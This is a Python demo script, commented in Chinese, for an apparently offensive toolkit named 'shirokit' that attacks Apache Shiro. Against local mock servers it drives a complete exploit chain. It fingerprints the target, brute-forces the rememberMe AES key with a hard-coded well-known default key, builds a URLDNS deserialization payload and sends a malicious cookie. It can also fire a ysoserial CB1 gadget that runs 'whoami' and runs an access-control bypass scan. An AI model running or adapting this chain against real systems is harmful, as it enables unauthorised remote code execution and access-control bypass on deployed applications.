#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""本地端到端演示：不需要真实目标，直接观察工具链是否真的能打通。

流程：
    1. 启动 MockShiro（真实 AES 解密 + deleteMe + URLDNS 解析回调）；
    2. `python -m shirokit fp`            识别 Shiro / deleteMe 基线；
    3. `python -m shirokit brute`         23 个内置密钥里只有 1 个正确，看能否精确命中；
    4. `python -m shirokit payload url`   生成内置 URLDNS payload；
    5. `python -m shirokit exploit`       用正确密钥构造 Cookie 并发送；
    6. `python -m shirokit bypass`        对 MockSpring 跑权限绕过字典。

用法::  python examples/demo_local.py
"""

from __future__ import annotations

import os
import socket
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from shirokit import gadgets, keys  # noqa: E402
from tests.mock_shiro import MockShiro, MockSpring  # noqa: E402

KEY = "kPH+bIxk5D2deZiIxcaaaA=="


def free_udp_port() -> int:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])
    finally:
        sock.close()


def run(*args: str) -> int:
    cmd = [sys.executable, "-m", "shirokit", *args]
    print("\n$ python -m shirokit " + " ".join(args), flush=True)
    env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
    proc = subprocess.run(cmd, cwd=ROOT, env=env)
    return proc.returncode


def main() -> int:
    dns_port = free_udp_port()
    mock = MockShiro(KEY, dns_target=("127.0.0.1", dns_port)).start()
    spring = MockSpring().start()
    failures: list[str] = []
    print("=" * 70)
    print(" shirokit 本地演示")
    print(f" 靶场: {mock.url}   (AES 密钥 {KEY})")
    print(f" Spring 靶场: {spring.url}")
    print(f" 回调 DNS 端口: {dns_port}")
    print("=" * 70)
    try:
        steps = [
            ("指纹识别", run("fp", "-u", mock.url)),
            ("密钥爆破", run("brute", "-u", mock.url, "-d", "cb.test",
                              "--dns-port", str(dns_port),
                              "--callback-timeout", "3", "--verify",
                              "--workers", "4")),
            ("生成 payload", run("payload", "url", "--host", "demo.cb.test",
                                  "-o", os.path.join(ROOT, "demo-urldns.bin"))),
            ("发送恶意 Cookie", run("exploit", "-u", mock.url, "-k", KEY,
                                    "-p", os.path.join(ROOT, "demo-urldns.bin"))),
            ("权限绕过扫描", run("bypass", "-u", spring.url, "-p", "/admin/",
                                  "--threads", "4")),
        ]
        jar = gadgets.find_ysoserial()
        if jar:
            steps.insert(4, ("CB1 真实 gadget", run(
                "exploit", "-u", mock.url, "-k", KEY, "-g", "CB1",
                "-c", "whoami", "-y", jar)))
        else:
            print("\n[*] 未找到 ysoserial.jar，跳过 CB1 真实 gadget 步骤")
        for name, code in steps:
            print(f"[demo] {name}: {'OK' if code == 0 else f'返回码 {code}'}")
            if code != 0:
                failures.append(name)
        print("\n[*] 靶场收到的恶意 Cookie 数量:",
              len(mock.remembered_payloads) + len(mock.executed))
        print("[*] 靶场识别到的回调域名:",
              [item.get("host") for item in mock.remembered_payloads])
        print("[*] 内置密钥数量:", len(keys.load_keys()))
    finally:
        mock.stop()
        spring.stop()
        payload_path = os.path.join(ROOT, "demo-urldns.bin")
        if os.path.exists(payload_path):
            os.remove(payload_path)
    if failures:
        print("\n[!] 以下步骤未按预期返回 0:", ", ".join(failures))
        return 1
    print("\n[+] 演示完成：指纹、爆破、利用（URLDNS + CB1）、绕过五条链路均按预期工作")
    return 0


if __name__ == "__main__":
    sys.exit(main())
